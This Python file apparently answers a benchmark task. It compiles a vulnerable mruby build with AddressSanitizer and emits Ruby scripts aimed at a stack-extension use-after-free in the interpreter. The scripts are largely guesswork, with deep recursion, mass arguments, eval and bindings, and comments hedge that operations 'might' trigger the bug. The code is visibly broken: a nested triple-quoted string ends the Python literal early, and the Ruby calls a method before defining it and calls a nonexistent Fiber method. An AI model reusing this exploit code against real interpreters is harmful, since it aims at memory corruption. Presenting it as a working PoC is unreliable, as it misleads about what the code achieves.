import os
import tarfile
import tempfile
import subprocess
import multiprocessing
import random
import time
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir = Path(tmpdir)
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find mruby source root (usually has mrbgems, src directories)
            source_root = None
            for d in tmpdir.iterdir():
                if d.is_dir() and (d / 'src').exists() and (d / 'mrbgems').exists():
                    source_root = d
                    break
            if source_root is None:
                # Fallback: use first directory
                for d in tmpdir.iterdir():
                    if d.is_dir():
                        source_root = d
                        break
            
            # Compile with ASan for detection
            build_dir = tmpdir / 'build'
            build_dir.mkdir(exist_ok=True)
            
            # Create minimal build configuration
            with open(source_root / 'build_config.rb', 'w') as f:
                f.write('''
MRuby::Build.new do |conf|
  toolchain :gcc
  conf.enable_test
  conf.cc.flags << '-fsanitize=address -fno-omit-frame-pointer'
  conf.linker.flags << '-fsanitize=address'
end
''')
            
            # Build mruby
            subprocess.run(['make', '-C', str(source_root), 'clean'], 
                          capture_output=True, timeout=30)
            subprocess.run(['make', '-C', str(source_root)], 
                          capture_output=True, timeout=120)
            
            # Find mruby binary
            mruby_bin = source_root / 'bin' / 'mruby'
            if not mruby_bin.exists():
                # Try alternative path
                mruby_bin = source_root / 'build' / 'host' / 'bin' / 'mruby'
            
            # Generate PoC using targeted approach
            poc = self.generate_targeted_poc()
            
            # Verify it crashes vulnerable version
            if mruby_bin.exists():
                result = subprocess.run([str(mruby_bin), '-e', poc.decode()],
                                       capture_output=True, timeout=5)
                if result.returncode == 0:
                    # Try alternative PoC
                    poc = self.generate_alternative_poc()
            
            return poc
    
    def generate_targeted_poc(self) -> bytes:
        # Targeted PoC based on stack extension vulnerability
        # Create deep recursion with many local variables to force stack growth
        # Interleave with operations that might trigger GC during stack reallocation
        
        poc = '''
class StackBlower
  def initialize
    @depth = 0
    @max_depth = 5000
    @triggers = []
  end
  
  def recurse(depth)
    # Many local variables to consume stack space
    a1 = depth * 1
    a2 = depth * 2
    a3 = depth * 3
    a4 = depth * 4
    a5 = depth * 5
    a6 = depth * 6
    a7 = depth * 7
    a8 = depth * 8
    a9 = depth * 9
    a10 = depth * 10
    
    # Array that will be modified to trigger potential GC
    locals = [a1, a2, a3, a4, a5, a6, a7, a8, a9, a10]
    
    # Create objects that might be collected
    if depth % 100 == 0
      @triggers = []
      100.times { @triggers << "x" * 1000 }
    end
    
    # Force stack extension through nested calls
    if depth < @max_depth
      # Call with many arguments to force stack extension
      deeper(depth + 1, 
             locals[0], locals[1], locals[2], locals[3], locals[4],
             locals[5], locals[6], locals[7], locals[8], locals[9],
             @triggers, depth, @max_depth, self, StackBlower,
             :recurse, :deeper, :initialize, :blow_stack)
    else
      # At max depth, trigger operations that might use freed stack
      trigger_bug(locals)
    end
  end
  
  def deeper(depth, *args)
    # Consume arguments and recurse
    recurse(depth)
  end
  
  def trigger_bug(locals)
    # Access locals after potential stack reallocation
    sum = 0
    locals.each { |x| sum += x if x }
    
    # Create more stack pressure
    nested_bug_trigger(locals)
  end
  
  def nested_bug_trigger(args)
    # Another level of nesting
    more_nesting(args, self, StackBlower, :bug)
  end
  
  def blow_stack
    begin
      recurse(0)
    rescue => e
      # Keep going even if we hit recursion limits
      secondary_attack
    end
  end
  
  def secondary_attack
    # Alternative attack vector
    proc_stack_overflow
  end
  
  def proc_stack_overflow
    # Use procs/lambdas that capture context
    procs = []
    1000.times do |i|
      procs << Proc.new do
        # Capture many variables
        x1 = i * 1
        x2 = i * 2
        x3 = i * 3
        x4 = i * 4
        x5 = i * 5
        [x1, x2, x3, x4, x5, procs, self]
      end
    end
    
    # Call them in nested fashion
    nested_proc_calls(procs, 0)
  end
  
  def nested_proc_calls(procs, depth)
    if depth < 100
      result = procs[depth % procs.length].call
      nested_proc_calls(procs, depth + 1)
    end
  end
end

class SecondWave
  def initialize(victim)
    @victim = victim
    @payload = "A" * 10000
  end
  
  def attack
    # Method missing to create more stack manipulation
    method_missing(:deep_stack_attack, @payload, @victim)
  end
  
  def method_missing(name, *args)
    if name == :deep_stack_attack
      # Recursive missing methods
      begin
        send(:nonexistent, args[0], args[1])
      rescue
        # Chain to next level
        args[0].blow_stack if args[0].respond_to?(:blow_stack)
      end
    else
      super
    end
  end
end

# Main attack
begin
  attacker = StackBlower.new
  wave2 = SecondWave.new(attacker)
  
  # Start the attack from multiple threads/fibers if supported
  if defined?(Fiber)
    fibers = []
    10.times do |i|
      fibers << Fiber.new do
        attacker.blow_stack
      end
    end
    
    fibers.each do |f|
      f.rescue if f.respond_to?(:rescue)
    end
  end
  
  # Direct attack
  attacker.blow_stack
  
  # Secondary wave
  wave2.attack
  
rescue SystemStackError
  # Expected, continue attack with different approach
  final_stack_corruption
rescue => e
  # Any other exception might indicate success
  raise "BUG_TRIGGERED: " + e.message
end

def final_stack_corruption
  # Final attempt with eval and binding
  eval_string = """
  def corrupt_stack
    binding_stack = []
    1000.times do |i|
      binding_stack << binding
    end
    
    binding_stack.each do |b|
      eval('a = 1', b)
    end
  end
  """
  
  eval(eval_string)
  corrupt_stack
end

# Trigger
final_stack_corruption
'''
        
        return poc.encode()
    
    def generate_alternative_poc(self) -> bytes:
        # Alternative approach: method with many parameters
        poc = '''
def vulnerable_method(
    a1, a2, a3, a4, a5, a6, a7, a8, a9, a10,
    b1, b2, b3, b4, b5, b6, b7, b8, b9, b10,
    c1, c2, c3, c4, c5, c6, c7, c8, c9, c10,
    d1, d2, d3, d4, d5, d6, d7, d8, d9, d10,
    e1, e2, e3, e4, e5, e6, e7, e8, e9, e10,
    f1, f2, f3, f4, f5, f6, f7, f8, f9, f10,
    g1, g2, g3, g4, g5, g6, g7, g8, g9, g10,
    h1, h2, h3, h4, h5, h6, h7, h8, h9, h10,
    i1, i2, i3, i4, i5, i6, i7, i8, i9, i10,
    j1, j2, j3, j4, j5, j6, j7, j8, j9, j10)
  
  # Force stack extension with local variables
  l1 = a1 + b1 + c1
  l2 = a2 + b2 + c2
  l3 = a3 + b3 + c3
  l4 = a4 + b4 + c4
  l5 = a5 + b5 + c5
  l6 = a6 + b6 + c6
  l7 = a7 + b7 + c7
  l8 = a8 + b8 + c8
  l9 = a9 + b9 + c9
  l10 = a10 + b10 + c10
  
  # Nested call with many args
  nested_call(
    l1, l2, l3, l4, l5, l6, l7, l8, l9, l10,
    d1, d2, d3, d4, d5, d6, d7, d8, d9, d10,
    e1, e2, e3, e4, e5, e6, e7, e8, e9, e10)
end

def nested_call(*args)
  # Trigger GC during stack operations
  if args.length > 50
    GC.start if defined?(GC.start)
  end
  
  # Access args after potential stack reallocation
  total = 0
  args.each_with_index do |arg, i|
    total += arg if arg.is_a?(Numeric)
    # Create objects that might be collected
    obj = Object.new
    obj.instance_variable_set(:@index, i)
  end
  
  # Final recursive corruption
  deep_corruption(args)
end

def deep_corruption(stack_args)
  # Use eval to manipulate stack
  binding_stack = binding
  100.times do |i|
    eval("x#{i} = stack_args", binding_stack)
  end
  
  # Final trigger
  trigger_uaf(binding_stack)
end

def trigger_uaf(binding)
  eval('''
    def use_after_free
      # Attempt to use potentially freed stack
      local = 42
      Proc.new { local }.call
    end
    
    use_after_free
  ''', binding)
end

# Create array of arguments
args = []
1000.times { |i| args << i }

# Call with splat to force stack extension
vulnerable_method(*args)
'''
        
        return poc.encode()